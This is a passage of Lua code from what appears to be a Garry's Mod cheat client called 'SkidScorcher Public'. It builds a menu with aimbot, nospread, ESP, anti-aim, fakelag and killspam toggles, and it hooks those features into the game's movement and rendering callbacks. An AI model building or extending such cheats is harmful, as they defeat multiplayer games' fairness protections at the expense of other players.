	slider:SetSize(192, 32)
	local x = 10
	local y = 64 + (22 * (index - 1))
	if (y + 27) >= frame:GetTall() then
		local firstindex = 0
		for i = 1, index do
			local _y = 64 + (22 * (i - 1))
			if (_y + 27) >= frame:GetTall() then
				firstindex = i
				break
			end
		end

		x = (x * 2.5) + 192
		y = 64 + (22 * (index - (firstindex - 1) - 1))
	end

	slider:SetPos(x, y)
	function slider.Paint(self, width, height)
		draw.SimpleText(name .. " [" .. math.Round(cvar:GetFloat(), dec) .. "]", "gamer tab", width / 2, height / 2 - (height / 4), Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		surface.SetDrawColor(Color(100, 100, 100))
		surface.DrawRect(0, height / 1.25, width, 1)
		surface.DrawRect(math.Clamp(((cvar:GetFloat() * 10) - min) / (max - min) * width - 2, 0, width - 4), height / 1.25 - 4, 4, 8)
		if input.IsMouseDown(MOUSE_LEFT) then
			local fx, fy = frame:GetPos()
			local sx, sy = slider:GetPos()
			local rx = fx + sx
			local ry = fy + sy
			local ssx, ssy = slider:GetSize()
			local mx = gui.MouseX()
			local my = gui.MouseY()
			local rmx = mx - rx
			if ((mx >= rx) and ((rx + ssx) >= mx)) and ((my >= ry) and ((ry + ssy) >= my)) then
				cvar:SetFloat(math.Round(rmx / width * ((max / 10) - (min / 10)) + (min / 10), dec))
			end
		end
	end

	function slider.DoClick() end

	if ok.curtab != tab then
		slider:SetVisible(false)
	end

	ok.menuitems[tab][#ok.menuitems[tab] + 1] = slider
end

function ok.Menu()
	ok.menuitems = {{}, {}, {}, {}}
	local frame = vgui.Create("DFrame")
	frame:SetTitle("")
	frame:SetSize(600, 450)
	frame:SetPos(0, 0)
	frame:ShowCloseButton(false)
	frame:SetDraggable(false)
	frame:Center()
	frame:MakePopup()
	function frame.Paint(self, width, height)
		surface.SetDrawColor(Color(75, 75, 75))
		surface.DrawRect(0, 0, width, height)
		draw.SimpleText("SkidScorcher Public", "gamer title", width / 2, 12, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	end

	local close = vgui.Create("DButton", frame)
	close:SetText("")
	close:SetSize(24, 24)
	close:SetPos(frame:GetWide() - 24, 0)
	function close.Paint(self, width, height)
		surface.SetDrawColor(Color(255, 0, 0))
		surface.DrawRect(0, 0, width, height)
	end

	function close.DoClick()
		frame:Remove()
	end

	//// TABS \\\\
	ok.CreateTab(frame, "Aimbot", 1, 4)
	ok.CreateTab(frame, "Visuals", 2, 4)
	ok.CreateTab(frame, "Misc", 3, 4)
	ok.CreateTab(frame, "HvH", 4, 4)

	//// AIMBOT TAB \\\\
	ok.CreateCheckbox(frame, "Enabled", 1, 1, "aimbot", "enabled")
	ok.CreateCheckbox(frame, "AutoWall", 1, 2, "aimbot", "autowall")
	ok.CreateCheckbox(frame, "Silent", 1, 3, "aimbot", "silent")
	ok.CreateCheckbox(frame, "NoSpread", 1, 4, "aimbot", "nospread")
	ok.CreateCheckbox(frame, "BodyAim", 1, 5, "aimbot", "bodyaim")
	ok.CreateCheckbox(frame, "Static AA", 1, 6, "aimbot", "static")
	ok.CreateCheckbox(frame, "NextShot", 1, 7, "aimbot", "nextshot")
	ok.CreateCheckbox(frame, "AutoShoot", 1, 8, "aimbot", "autoshoot")
	ok.CreateCheckbox(frame, "Ignore Team", 1, 9, "aimbot", "team")
	ok.CreateCheckbox(frame, "Ignore Friends", 1, 10, "aimbot", "friends")

	//// VISUALS TAB \\\\
	ok.CreateCheckbox(frame, "ESP Enabled", 2, 1, "visuals", "esp")
	ok.CreateCheckbox(frame, "Name ESP", 2, 2, "visuals", "name")
	ok.CreateCheckbox(frame, "Box ESP", 2, 3, "visuals", "box")
	ok.CreateCheckbox(frame, "Weapon ESP", 2, 4, "visuals", "weapon")
	ok.CreateCheckbox(frame, "Rank ESP", 2, 5, "visuals", "rank")
	ok.CreateCheckbox(frame, "Healthbar", 2, 6, "visuals", "health")
	ok.CreateSlider(frame, "FOV", 2, 7, "visuals", "fov", 65, 125, 0)

	//// MISC TAB \\\\
	ok.CreateCheckbox(frame, "AutoHop", 3, 1, "misc", "autohop")
	ok.CreateCheckbox(frame, "HighJump", 3, 2, "misc", "highjump")
	ok.CreateCheckbox(frame, "Third Person", 3, 3, "misc", "thirdperson")
	ok.CreateCheckbox(frame, "KillSpam", 3, 4, "misc", "killspam")
	ok.CreateCheckbox(frame, "KillSpam TTS", 3, 5, "misc", "robo")
	ok.CreateCheckbox(frame, "AutoStrafe", 3, 6, "misc", "autostrafe")

	//// HVH TAB \\\\
	ok.CreateCheckbox(frame, "AntiAim", 4, 1, "hvh", "antiaim")
	ok.CreateCheckbox(frame, "Edge AntiAim", 4, 2, "hvh", "edge")
	ok.CreateSlider(frame, "Edge Method", 4, 3, "hvh", "edgemet", 1, 4, 0)
	ok.CreateCheckbox(frame, "Adaptive AntiAim", 4, 5, "hvh", "adaptive")
	ok.CreateSlider(frame, "Adaptive Yaw", 4, 6, "hvh", "adapyaw", 270, 540, 0)
	ok.CreateSlider(frame, "Adaptive Max", 4, 8, "hvh", "adapmax", 2, 30, 0)
	ok.CreateSlider(frame, "Adaptive Speed", 4, 10, "hvh", "adapspeed", 1, 15, 0)
	ok.CreateSlider(frame, "AntiAim Pitch", 4, 12, "hvh", "pitch", -250, 250, 0)
	ok.CreateSlider(frame, "AntiAim Yaw", 4, 14, "hvh", "yaw", 270, 541, 0)
	ok.CreateCheckbox(frame, "FakeLag", 4, 16, "hvh", "fakelag")
	ok.CreateSlider(frame, "FakeLag Choke", 4, 17, "hvh", "flchoke", 2, 14, 0)
end

ok.AddHook("Think", "ok.GetTarget", ok.GetTarget)
ok.AddHook("Move", "ok.GetCurTime", ok.GetCurTime)
ok.AddHook("HUDPaint", "ok.Visuals", ok.Visuals)
ok.AddHook("CreateMove", "ok.CreateMove", ok.CreateMove)
ok.AddHook("CalcView", "ok.CalcView", ok.CalcView)
ok.AddHook("ShouldDrawLocalPlayer", "ok.ShouldDrawLocalPlayer", ok.ShouldDrawLocalPlayer)
ok.AddHook("PreDrawOpaqueRenderables", "ok.PreDrawOpaqueRenderables", ok.PreDrawOpaqueRenderables)
gameevent.Listen("player_hurt")
ok.AddHook("player_hurt", "ok.PlayerHurt", ok.PlayerHurt)
concommand.Add("ok_menu", ok.Menu)
ok.Log("Created concommand: ", Color(255, 120, 5), "ok_menu", Color(255, 0, 0), " (" .. tostring(ok.Menu) .. ")")
concommand.Add("ok_resetcv", ok.ResetConsoleVars)
ok.Log("Created concommand: ", Color(255, 120, 5), "ok_resetcv", Color(255, 0, 0), " (" .. tostring(ok.ResetConsoleVars) .. ")")
ok.Log("Loaded!")